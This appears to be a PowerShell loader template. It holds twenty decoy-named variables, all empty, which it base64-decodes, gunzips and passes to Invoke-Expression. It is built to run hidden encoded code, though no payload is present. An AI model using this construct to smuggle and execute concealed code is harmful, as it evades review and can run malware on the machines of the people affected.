#Requires -Version 2

$Converging = ""
$Typewrites = ""
$Ecmascript = ""
$Originates = ""
$Scurrilous = ""
$Clambering = ""
$Disastrous = ""
$Skedaddled = ""
$Biospheres = ""
$Ozymandias = ""
$Diligently = ""
$Intonation = ""
$Scrounging = ""
$Sketchiest = ""
$Tenderizes = ""
$Abstention = ""
$Floppiness = ""
$Acquirable = ""
$Earthworms = ""
$Stutterers = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Converging,$Typewrites,$Ecmascript,$Originates,$Scurrilous,$Clambering,$Disastrous,$Skedaddled,$Biospheres,$Ozymandias,$Diligently,$Intonation,$Scrounging,$Sketchiest,$Tenderizes,$Abstention,$Floppiness,$Acquirable,$Earthworms,$Stutterers)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    ConvertFrom-Gzip -Bytes $Decoded | Invoke-Expression
}
